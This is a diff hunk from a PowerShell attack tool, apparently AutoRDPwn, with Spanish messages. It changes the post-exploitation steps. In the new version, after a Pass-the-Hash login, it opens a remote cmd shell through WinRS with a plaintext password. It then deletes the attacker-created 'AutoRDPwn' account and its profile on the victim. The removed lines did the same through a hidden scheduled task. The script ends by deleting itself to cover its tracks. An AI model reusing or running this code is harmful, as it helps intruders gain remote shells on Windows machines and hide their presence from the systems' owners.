@@ -282,9 +282,7 @@ $session = get-pssession ; Write-Host "" ; if ($session){ Write-Host "Iniciando 
 $PlainTextPassword = ConvertFrom-SecureToPlain $password
 if ($console){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
-if ($hash){ invoke-command -session $RDP[0] -scriptblock { 
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe -NoProfile -WindowStyle Hidden net user AutoRDPwn /delete ; rmdir C:\Users\AutoRDPwn* -Confirm:$false -Force ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false'
-$time = Get-Date -Format t
-$trigger =  New-ScheduledTaskTrigger -Once -At $time
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" }}
+if ($hash){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" 
+ Write-Host "" ;  Write-Host"Eliminando credenciales creadas para Pass The Hash.." -ForegroundColor Magenta ; sleep -milliseconds 2000
+invoke-command -session $RDP[0] -scriptblock { powershell.exe net user AutoRDPwn /delete ; rmdir C:\Users\AutoRDPwn* -Confirm:$false -Force }}
 $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript
